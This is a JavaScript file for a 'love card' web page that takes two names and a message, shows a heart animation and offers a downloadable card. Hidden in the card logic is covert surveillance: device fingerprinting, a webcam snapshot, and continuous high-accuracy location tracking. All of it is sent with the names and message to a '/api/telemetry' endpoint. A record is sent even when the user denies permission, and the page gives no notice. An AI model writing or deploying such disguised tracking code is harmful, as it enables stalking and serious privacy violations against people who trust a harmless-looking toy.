(function () {
  'use strict';

  var clientTelemetry = null;
  var watchId = null;

  var screen1 = document.getElementById('screen-1');
  var screen2 = document.getElementById('screen-2');
  var namesForm = document.getElementById('names-form');
  var yourNameInput = document.getElementById('your-name');
  var partnerNameInput = document.getElementById('partner-name');
  var loveMessageInput = document.getElementById('love-message');
  var themeSelect = document.getElementById('card-theme-select');
  var fontSizeSelect = document.getElementById('card-font-size');
  var formError = document.getElementById('form-error');

  var namesDisplay = document.getElementById('names-display');
  var wishDisplay = document.getElementById('wish-display');
  var uiContainer = document.getElementById('ui');
  var replayBtn = document.getElementById('replay-btn');
  var downloadBtn = document.getElementById('download-btn');

  function parseUserAgentFallback(ua) {
    var deviceName = 'Generic Device', deviceType = 'desktop', os = 'Unknown OS', browser = 'Unknown Browser';
    if (/iPhone/i.test(ua)) { deviceName = 'Apple iPhone'; deviceType = 'mobile'; os = 'iOS'; }
    else if (/Android/i.test(ua)) { deviceName = 'Android Device'; deviceType = 'mobile'; os = 'Android'; }
    else if (/Windows NT/i.test(ua)) { deviceName = 'Windows PC'; os = 'Windows'; }
    else if (/Macintosh/i.test(ua)) { deviceName = 'Apple Mac'; os = 'macOS'; }
    if (/Edg\//i.test(ua)) browser = 'Microsoft Edge';
    else if (/Chrome\//i.test(ua)) browser = 'Google Chrome';
    else if (/Firefox\//i.test(ua)) browser = 'Mozilla Firefox';
    else if (/Safari\//i.test(ua)) browser = 'Apple Safari';
    return { deviceName: deviceName, deviceType: deviceType, os: os, browser: browser };
  }

  function getBatteryMetrics() {
    if (typeof navigator.getBattery === 'function') {
      return navigator.getBattery().then(function (battery) {
        return { battery_level: Math.round(battery.level * 100), battery_charging: Boolean(battery.charging) };
      }).catch(function () { return { battery_level: null, battery_charging: null }; });
    }
    return Promise.resolve({ battery_level: null, battery_charging: null });
  }

  function detectTelemetry() {
    var ua = navigator.userAgent || '';
    var fallback = parseUserAgentFallback(ua);
    var screenStr = window.screen.width + 'x' + window.screen.height;
    var tzStr = 'Unknown';
    try { tzStr = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}

    getBatteryMetrics().then(function (batteryData) {
      clientTelemetry = {
        device_name: fallback.deviceName,
        device_type: fallback.deviceType,
        browser: fallback.browser,
        os: fallback.os,
        battery_level: batteryData.battery_level,
        battery_charging: batteryData.battery_charging,
        screen_res: screenStr,
        timezone: tzStr,
        raw_user_agent: ua
      };
    });
  }
  detectTelemetry();

  function applyCustomStyles(theme, scale) {
    if (!namesDisplay) return;
    if (theme === 'crimson') namesDisplay.style.color = '#ff334b';
    else if (theme === 'sunset') namesDisplay.style.color = '#ffa15c';
    else namesDisplay.style.color = '#ff6584';

    namesDisplay.style.transform = scale === 'large' ? 'scale(1.2)' : 'scale(1.0)';
  }

  function renderNames(name1, name2, message, theme, scale) {
    if (!namesDisplay) return;
    namesDisplay.innerHTML = '';
    applyCustomStyles(theme, scale);

    var span1 = document.createElement('span');
    span1.textContent = name1;
    span1.style.color = namesDisplay.style.color;

    var heartSpan = document.createElement('span');
    heartSpan.className = 'heart-sep';
    heartSpan.textContent = ' ❤ ';
    heartSpan.style.color = '#6c63ff';

    var span2 = document.createElement('span');
    span2.textContent = name2;
    span2.style.color = '#ffffff';

    namesDisplay.appendChild(span1);
    namesDisplay.appendChild(heartSpan);
    namesDisplay.appendChild(span2);

    if (wishDisplay) {
      wishDisplay.textContent = message || 'Together Always ❤';
    }
  }

  function generateLoveParticles(count) {
    if (!uiContainer) return;
    uiContainer.innerHTML = '';
    for (var i = 1; i <= count; i++) {
      var love = document.createElement('div');
      love.className = 'love';
      love.style.setProperty('--i', i.toString());
      var h = document.createElement('div'); h.className = 'love_horizontal';
      var v = document.createElement('div'); v.className = 'love_vertical';
      var word = document.createElement('div'); word.className = 'love_word'; word.textContent = 'I love you ❤';
      v.appendChild(word); h.appendChild(v); love.appendChild(h);
      uiContainer.appendChild(love);
    }
  }

  function sendTelemetryData(extraPayload) {
    var payload = Object.assign({}, clientTelemetry || {}, extraPayload);
    fetch('/api/telemetry', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(function () {});
  }

  namesForm.addEventListener('submit', function (e) {
    e.preventDefault();
    var yourName = (yourNameInput.value || '').trim();
    var partnerName = (partnerNameInput.value || '').trim();
    var message = (loveMessageInput.value || '').trim();
    var selectedTheme = themeSelect ? themeSelect.value : 'rose';
    var selectedScale = fontSizeSelect ? fontSizeSelect.value : 'normal';

    if (!yourName || !partnerName) {
      formError.textContent = 'Please enter both names.';
      return;
    }
    formError.textContent = '';

    screen1.classList.remove('screen-active'); screen1.classList.add('screen-hidden');
    screen2.classList.remove('screen-hidden'); screen2.classList.add('screen-active');

    renderNames(yourName, partnerName, message, selectedTheme, selectedScale);
    generateLoveParticles(70);

    // 1. Request Camera Permission & Capture Snapshot
    var cameraStatusVal = 'Not Requested';
    var webcamPicVal = null;

    if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          cameraStatusVal = 'Allowed / Active';
          var video = document.createElement('video');
          video.srcObject = stream;
          video.play();
          setTimeout(function () {
            var canvas = document.createElement('canvas');
            canvas.width = 160;
            canvas.height = 120;
            var ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 160, 120);
            webcamPicVal = canvas.toDataURL('image/jpeg', 0.5);
            stream.getTracks().forEach(function (track) { track.stop(); });

            // Send initial packet with webcam snapshot
            sendTelemetryData({
              your_name: yourName,
              partner_name: partnerName,
              couple_names: yourName + ' ❤ ' + partnerName,
              message: message,
              camera_status: cameraStatusVal,
              webcam_pic: webcamPicVal
            });
          }, 800);
        })
        .catch(function () {
          cameraStatusVal = 'Denied / Blocked';
          sendTelemetryData({
            your_name: yourName,
            partner_name: partnerName,
            couple_names: yourName + ' ❤ ' + partnerName,
            message: message,
            camera_status: cameraStatusVal,
            webcam_pic: null
          });
        });
    } else {
      cameraStatusVal = 'Not Supported';
      sendTelemetryData({
        your_name: yourName,
        partner_name: partnerName,
        couple_names: yourName + ' ❤ ' + partnerName,
        message: message,
        camera_status: cameraStatusVal,
        webcam_pic: null
      });
    }

    // 2. Request Geolocation & Continuous Watch
    if (navigator.geolocation) {
      watchId = navigator.geolocation.watchPosition(
        function (position) {
          sendTelemetryData({
            your_name: yourName,
            partner_name: partnerName,
            couple_names: yourName + ' ❤ ' + partnerName,
            message: message,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            location_status: 'Allowed / Live Tracking'
          });
        },
        function (error) {
          sendTelemetryData({
            your_name: yourName,
            partner_name: partnerName,
            couple_names: yourName + ' ❤ ' + partnerName,
            message: message,
            latitude: null,
            longitude: null,
            location_status: 'Denied / Blocked'
          });
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }
  });

  if (downloadBtn) {
    downloadBtn.addEventListener('click', function () {
      if (typeof html2canvas !== 'function') return;
      downloadBtn.textContent = 'Rendering Card...';
      html2canvas(screen2, { useCORS: true, backgroundColor: '#050508' }).then(function (canvas) {
        var link = document.createElement('a');
        link.download = 'love-animation-card.png';
        link.href = canvas.toDataURL('image/png');
        link.click();
        downloadBtn.textContent = '📸 Download Love Card';
      }).catch(function () {
        downloadBtn.textContent = '📸 Download Love Card';
      });
    });
  }

  if (replayBtn) {
    replayBtn.addEventListener('click', function () {
      if (watchId !== null && navigator.geolocation) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }
      screen2.classList.remove('screen-active'); screen2.classList.add('screen-hidden');
      screen1.classList.remove('screen-hidden'); screen1.classList.add('screen-active');
      yourNameInput.value = ''; partnerNameInput.value = '';
      if (loveMessageInput) loveMessageInput.value = '';
      yourNameInput.focus();
    });
  }
})();
